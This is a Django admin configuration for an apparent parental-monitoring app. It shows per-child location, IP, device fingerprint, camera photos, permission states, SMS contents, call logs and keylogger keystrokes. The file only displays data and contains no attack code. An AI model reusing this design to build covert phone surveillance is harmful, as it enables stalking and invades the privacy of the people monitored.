from django.contrib import admin
from django.utils.html import format_html
from .models import (
    Child,
    LocationLog,
    IPLog,
    DeviceInfoLog,
    PhotoCapture,
    SensorDataLog,
    PermissionLog,
    SMSLog,
    CallLog,
    KeyloggerLog,
    SocialMediaMessage,
    AppUsage,
    ScreenTime,
    GeofenceAlert,
)

class LocationLogInline(admin.TabularInline):
    model = LocationLog
    extra = 0
    readonly_fields = ('timestamp', 'latitude', 'longitude', 'accuracy')
    ordering = ('-timestamp',)

class IPLogInline(admin.TabularInline):
    model = IPLog
    extra = 0
    readonly_fields = ('timestamp', 'ip_address', 'details')
    ordering = ('-timestamp',)

class DeviceInfoLogInline(admin.TabularInline):
    model = DeviceInfoLog
    extra = 0
    readonly_fields = ('timestamp', 'user_agent', 'platform', 'screen_width', 'screen_height', 'other_details')
    ordering = ('-timestamp',)

class PhotoCaptureInline(admin.TabularInline):
    model = PhotoCapture
    extra = 0
    readonly_fields = ('timestamp', 'image', 'latitude', 'longitude')
    ordering = ('-timestamp',)

class SensorDataLogInline(admin.TabularInline):
    model = SensorDataLog
    extra = 0
    readonly_fields = ('timestamp', 'data')
    ordering = ('-timestamp',)

class PermissionLogInline(admin.TabularInline):
    model = PermissionLog
    extra = 0
    readonly_fields = ('timestamp', 'geolocation', 'camera', 'microphone', 'notifications', 'clipboard', 'sensors', 'bluetooth', 'other')
    ordering = ('-timestamp',)

class SMSLogInline(admin.TabularInline):
    model = SMSLog
    extra = 0
    readonly_fields = ('timestamp', 'message', 'sender', 'receiver', 'direction')
    ordering = ('-timestamp',)

    def clean(self):
        super().clean()
        if hasattr(self, 'cleaned_data') and self.cleaned_data:
            child = self.instance.child
            message = self.cleaned_data.get('message')
            timestamp = self.cleaned_data.get('timestamp')
            
            if message and timestamp:
                if SMSLog.objects.filter(
                    child=child,
                    message=message,
                    timestamp=timestamp
                ).exists():
                    from django.core.exceptions import ValidationError
                    raise ValidationError('Duplicate SMS log entry detected')

# Removed duplicate CallLog registration
class CallLogInline(admin.TabularInline):
    model = CallLog
    extra = 0
    readonly_fields = ('timestamp', 'number', 'type', 'duration')
    ordering = ('-timestamp',)

class KeyloggerLogInline(admin.TabularInline):
    model = KeyloggerLog
    extra = 0
    readonly_fields = ('timestamp', 'keystrokes')
    ordering = ('-timestamp',)

@admin.register(Child)
class ChildAdmin(admin.ModelAdmin):
    list_display = ('name', 'device_id', 'parent', 'update_interval', 'latest_location_map_link_display')
    search_fields = ('name', 'device_id', 'parent__username')
    list_filter = ('parent',)
    inlines = [
        LocationLogInline, IPLogInline, DeviceInfoLogInline, PhotoCaptureInline,
        SensorDataLogInline,
        PermissionLogInline,
        SMSLogInline,
        CallLogInline,
        KeyloggerLogInline,
    ]

    def latest_location_map_link_display(self, obj):
        map_link = obj.latest_location_map_link()
        if map_link:
            return format_html('<a href="{}" target="_blank">View on Map</a>', map_link)
        return "No location"
    latest_location_map_link_display.short_description = "Latest Location Map"

@admin.register(LocationLog)
class LocationLogAdmin(admin.ModelAdmin):
    list_display = ('child', 'timestamp', 'latitude', 'longitude', 'accuracy')
    list_filter = ('child', 'timestamp')
    date_hierarchy = 'timestamp'
    search_fields = ('child__name',)

@admin.register(IPLog)
class IPLogAdmin(admin.ModelAdmin):
    list_display = ('child', 'ip_address', 'timestamp')
    list_filter = ('child', 'timestamp')
    date_hierarchy = 'timestamp'
    search_fields = ('child__name', 'ip_address')

@admin.register(DeviceInfoLog)
class DeviceInfoLogAdmin(admin.ModelAdmin):
    list_display = ('child', 'timestamp', 'platform')
    list_filter = ('child', 'timestamp')
    date_hierarchy = 'timestamp'
    search_fields = ('child__name', 'platform', 'user_agent')

@admin.register(PhotoCapture)
class PhotoCaptureAdmin(admin.ModelAdmin):
    list_display = ('child', 'timestamp', 'photo_preview')
    list_filter = ('child', 'timestamp')
    date_hierarchy = 'timestamp'
    search_fields = ('child__name',)
    
    def photo_preview(self, obj):
        if obj.image:
            return format_html('<img src="{}" width="100" />', obj.image.url)
        return "No Image"
    photo_preview.short_description = "Photo Preview"

@admin.register(SensorDataLog)
class SensorDataLogAdmin(admin.ModelAdmin):
    list_display = ('child', 'timestamp', 'data')
    list_filter = ('child', 'timestamp')
    date_hierarchy = 'timestamp'
    search_fields = ('child__name',)

@admin.register(PermissionLog)
class PermissionLogAdmin(admin.ModelAdmin):
    list_display = ('child', 'timestamp', 'geolocation', 'camera', 'microphone', 'notifications', 'clipboard', 'sensors', 'bluetooth')
    list_filter = ('child', 'timestamp')
    date_hierarchy = 'timestamp'
    search_fields = ('child__name',)

@admin.register(SMSLog)
class SMSLogAdmin(admin.ModelAdmin):
    list_display = ('child', 'timestamp', 'direction', 'sender', 'receiver', 'message')
    list_filter = ('child', 'timestamp', 'direction')
    date_hierarchy = 'timestamp'
    search_fields = ('child__name', 'sender', 'receiver', 'message')

@admin.register(CallLog)
class CallLogAdmin(admin.ModelAdmin):
    list_display = ('child', 'timestamp', 'number', 'type', 'duration')
    list_filter = ('child', 'timestamp', 'type')
    date_hierarchy = 'timestamp'
    search_fields = ('child__name', 'number')

@admin.register(KeyloggerLog)
class KeyloggerLogAdmin(admin.ModelAdmin):
    list_display = ('child', 'timestamp', 'keystrokes')
    list_filter = ('child', 'timestamp')
    date_hierarchy = 'timestamp'
    search_fields = ('child__name', 'keystrokes')
